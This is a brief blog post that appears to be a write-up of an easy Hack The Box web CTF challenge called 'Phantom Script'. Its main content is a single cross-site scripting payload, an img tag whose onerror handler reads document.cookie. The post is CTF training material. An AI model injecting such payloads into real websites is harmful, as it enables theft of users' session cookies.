---
layout: post
title:  "Phantom Script"
date:   2025-04-09 20:10:00 -0400
categories: HTB-challenge web very-easy
tags: HTB CTF writeup XSS 
---

### SOLUTION
We can see at the bottom right of the web, they provide us some examples of XSS payload
![](assets/img/htb/phantomscript/1.png)

By guessing, we combine 2 payloads then see what happend.
```
<img src=x onerror="alert(document.cookie)">
```
![](assets/img/htb/phantomscript/2.png)
